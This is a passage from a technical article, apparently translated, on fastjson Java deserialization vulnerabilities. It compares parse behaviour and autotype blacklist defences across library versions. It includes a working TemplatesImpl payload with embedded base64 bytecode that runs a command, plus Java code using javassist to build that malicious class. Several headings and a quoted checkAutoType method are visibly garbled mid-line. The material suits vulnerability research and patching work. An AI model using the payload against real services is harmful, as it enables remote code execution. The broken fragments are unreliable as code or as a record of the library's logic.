automatically called, the setter method (setAge, setName) corresponding to the
User class and the corresponding getter method (getAge, getName), and the
final result is a string. There are more getter methods (note that the bool
type starts with is), because parseObject calls `JSON.toJSON (obj)` when there
are no other parameters, and the obj property value will be obtained through
the gettter method later:
###### JSON.parseObject(serializedStr, Object.class)
    JSON.parseObject(serializedStr, Object.class)：
    call User default Constructor
    call User setName
    call User setAge
    call User setFlag
    parseObject deserialize object name:com.longofo.test.User
    parseObject deserialization:User{name='lala', age=11, flag=true, sex='boy', address='null'}
When @type is specified, there is no difference between this type of writing
and the first type of `JSON.parse(serializedStr)`.
###### JSON.parseObject(serializedStr, User.class)
    JSON.parseObject(serializedStr, User.class)：
    call User default Constructor
    call User setName
    call User setAge
    call User setFlag
    parseObject deserialize object name:com.longofo.test.User
    parseObject deserialization:User{name='lala', age=11, flag=true, sex='boy', address='null'}
When @type is specified, the default constructor of the User class is
automatically called, the setter method (setAge, setName) corresponding to the
User class, and the final result is an instance of the User class. This way of
writing clearly specifies that the target object must be of type User. If the
type corresponding to @type is not User or its subclass, a mismatch exception
will be thrown. However, even if a specific type is specified, there is still
a way before the type matches To trigger the vulnerability.
##### 1.2.10 Test
For the above User class, the test result is the same as 1.1.157, so I won't
write it here.
In this version, autotype is still enabled by default. However, from this
version, fastjson added denyList in ParserConfig, until version 1.2.24, this
denyList has only one class (however, this java.lang.Thread is not used for
exploits):
##### 1.2.25 Test
The test result is that an exception is thrown:
    serializedStr={"@type":"com.longofo.test.User","name":"lala","age":11, "flag": true}
    -----------------------------------------------    
    JSON.parse(serializedStr)：
    Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. com.longofo.test.User
        at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:882)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
        at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)
        at com.alibaba.fastjson.JSON.parse(JSON.java:137)
        at com.alibaba.fastjson.JSON.parse(JSON.java:128)
        at com.longofo.test.Test1.main(Test1.java:14)
Starting from 1.2.25, autotype is turned off by default. For autotype to be
turned on, later vulnerability analysis will be involved. And from 1.2.25, the
checkAutoType function is added. Its main function is to detect whether the
class specified by @type is in the white list or black list (using the
startswith method)
And whether the target class is a subclass or subinterface of two dangerous
classes (Classloader, DataSource), where the whitelist has the highest
priority, and the whitelist does not detect blacklists and dangerous classes
if allowed, otherwise it continues to detect blacklists and dangerous classes:
The number of blacklist classes and packages has been increased, and the
whitelist has also been added. Users can also call related methods to add
blacklist/whitelist to the list:
Many of the latter vulnerabilities are due to the repair of checkautotype and
some of its own logical defects, as well as the increasing blacklist.
##### 1.2.42 Test
As with 1.2.25, autotype is not enabled by default, so the result is the same,
directly throwing the exception that autotype is not enabled.
From this version, the denyList and acceptList have been replaced with decimal
hashcode, which makes the security research more difficult (however, the
calculation method of hashcode is still public. If you have a large number of
jar packages, such as maven warehouse, you can crawl the jar package, run the
class name and package name in batches.But if the blacklist is the package
name, it will take some time to find the specific available class):
The detection in checkAutotype has also been modified accordingly:
##### 1.2.61 Test
As the 1.2.25, autotype is not enabled by default, so the result is same,
directly throwing the exception that autotype is not enabled.
From 1.2.25 to 1.2.61, a lot of bypasses and blacklists have actually been
added, but this part of the vulnerability version line is written
specifically. The 1.2.61 version is written here mainly to illustrate the
blacklist defens means. In version 1.2.61, fastjson changed the hashcode from
decimal to hexadecimal:
However, the hexadecimal representation is the same as the decimal
representation, and jar packages can also be run in batches. In version
1.2.62, hex capital was added for uniformity:
The later version is the increase of blacklist.
#### Fastjson vulnerability version line
The following vulnerabilities will not be analyzed too much. Too many will
only briefly explain and give the payload to test and explain the repair
method.
##### ver setDataSourceName method call-> setAutocommit
method call-> context.lookup (datasourceName) call
###### com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
payload：
    {
      "rand1": {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes": [
          "yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"
        ],
        "_name": "aaa",
        "_tfactory": {},
        "_outputProperties": {}
      }
    }
Test（jdk=8u102，fastjson=1.2.24）：
    package com.longofo.test;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.codec.binary.Base64;
    public class Test3 {
        public static void main(String[] args) throws Exception {
            String evilCode_base64 = readClass();
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String payload = "{'rand1':{" +
                    "\"@type\":\"" + NASTY_CLASS + "\"," +
                    "\"_bytecodes\":[\"" + evilCode_base64 + "\"]," +
                    "'_name':'aaa'," +
                    "'_tfactory':{}," +
                    "'_outputProperties':{}" +
                    "}}\n";
            System.out.println(payload);
            //JSON.parse(payload, Feature.SupportNonPublicField); 成功
            //JSON.parseObject(payload, Feature.SupportNonPublicField); 成功
            //JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField); 成功
            //JSON.parseObject(payload, User.class, Feature.SupportNonPublicField); 成功
        }
        public static class AaAa {
        }
        public static String readClass() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.get(AaAa.class.getName());
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "AaAa" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
            byte[] evilCode = cc.toBytecode();
            return Base64.encodeBase64String(evilCode);
        }
    }
result：
Brief analysis of triggering reasons:
TemplatesImpl object recovery-> JavaBeanDeserializer.deserialze->
FieldDeserializer.setValue-> TemplatesImpl.getOutputProperties->
TemplatesImpl.newTransformer-> TemplatesImpl.getTransletInstance-> Through
defineTransletClasses, newInstance triggers the static code block of our own
constructed class
Brief description:
This vulnerability needs to enable the SupportNonPublicField feature, which
was also mentioned in the sample test. There is no corresponding setter for
`_bytecodes`,`_tfactory`, `_name`,`_outputProperties` and `_class` in the
TemplatesImpl class, so to assign values to these private properties, you need
to enable the SupportNonPublicField feature. The specific construction process
of the poc will not be analyzed here, you can see Master Liao's
[this](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%
A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%
92%8C%E5%88%86%E6%9E%90/), involving some details.
##### ver>=1.2.25&ver checkAutoType(String typeName, Class expectClass) {
            if (typeName == null) {
                return null;
            }
            final String className = typeName.replace('$', '.');
            // Position 1, if open autoTypeSupport, whitelist first, then blacklist
            if (autoTypeSupport || expectClass != null) {
                for (int i = 0; i  clazz = TypeUtils.getClassFromMapping(typeName);
            if (clazz == null) {
                clazz = deserializers.findClass(typeName);
            }